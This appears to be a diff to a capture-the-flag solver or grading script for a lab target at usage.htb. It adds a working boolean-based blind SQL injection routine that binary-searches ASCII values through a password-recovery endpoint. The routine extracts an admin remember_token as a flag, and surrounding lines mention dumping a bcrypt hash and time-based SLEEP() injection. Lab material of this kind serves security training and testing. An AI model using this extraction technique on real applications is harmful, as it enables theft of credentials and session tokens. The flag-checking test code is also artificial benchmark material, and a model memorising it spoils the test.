@@ -13,6 +13,7 @@ import requests
 
 MAIN = "http://usage.htb"
 ADMIN = "http://admin.usage.htb"
+EXPECTED_DB = os.environ["EXPECTED_DB_FLAG"]
 EXPECTED_USER = os.environ["EXPECTED_USER_FLAG"]
 EXPECTED_ROOT = os.environ["EXPECTED_ROOT_FLAG"]
 session = requests.Session()
@@ -85,6 +86,24 @@ baseline_false = post_forgot("missing-" + uuid.uuid4().hex + "@usage.htb", csrf)
 assert is_true(baseline_true) and not is_true(baseline_false)
 print("PASS: normal password recovery exposes a stable true/false response difference", flush=True)
 
+# The focused SQLi objective is the real Laravel-admin remember_token field.
+# It is a persistent-login token in the upstream package schema, not a test-only endpoint.
+def extract_ascii(expression, length):
+    chars = []
+    for position in range(1, length + 1):
+        low, high = 32, 126
+        while low <= high:
+            middle = (low + high) // 2
+            condition = "ASCII(SUBSTRING((" + expression + ")," + str(position) + ",1))>" + str(middle)
+            if predicate(condition):
+                low = middle + 1
+            else:
+                high = middle - 1
+        if low < 32 or low > 126:
+            raise AssertionError("blind extraction returned an invalid character")
+        chars.append(chr(low))
+    return "".join(chars)
+
 # Boolean-based blind SQLi: infer the bcrypt hash from the genuine MySQL table
 # using only the recovery endpoint. No database socket or target filesystem is
 # available to this attacker container.
@@ -95,6 +114,15 @@ def predicate(sql_condition):
 assert predicate("1=1")
 assert not predicate("1=2")
 print("PASS: true/false boolean SQL condition changes the application response", flush=True)
+
+db_flag = extract_ascii(
+    "SELECT remember_token FROM usage_blog.admin_users WHERE username='admin' LIMIT 1",
+    len(EXPECTED_DB),
+)
+assert db_flag == EXPECTED_DB, ("database Flag mismatch", db_flag)
+assert re.fullmatch(r"TTP\{[a-z2-7]{16}\}", db_flag)
+print("PASS: extracted the exact version-baked Flag from the real admin_users.remember_token field", flush=True)
+
 
 # Time-based blind SQLi is a separate assertion, not inferred from the boolean
 # response test. The true predicate must cause a real MySQL SLEEP() delay.
